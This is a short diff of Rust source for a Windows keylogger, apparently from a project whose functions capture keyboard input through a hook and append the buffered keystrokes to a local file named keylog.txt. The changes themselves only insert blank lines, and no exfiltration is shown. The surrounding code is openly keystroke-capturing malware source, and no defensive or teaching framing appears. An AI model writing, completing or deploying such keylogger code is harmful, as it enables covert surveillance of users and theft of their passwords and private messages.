@@ -97,12 +97,14 @@ unsafe fn process_keyboard_input(l_param: LPARAM) {
 }
 
 fn log_keyboard_input(cloned_buffer: &Vec<u16>) {
+    
     println!("\nDumping buffer to keylog file.");
     let mut file = OpenOptions::new()
         .create(true)
         .append(true)
         .open("keylog.txt")
         .unwrap();
+
     if let Ok(s) = String::from_utf16(cloned_buffer) {
         file.write_all(s.as_bytes()).unwrap();
         println!("Buffer successfully dumped to keylog file.");
@@ -110,6 +112,7 @@ fn log_keyboard_input(cloned_buffer: &Vec<u16>) {
         eprintln!("Failed to convert buffer to string.");
     }
 }
+
 
 pub fn run_keylogger() {
     unsafe {
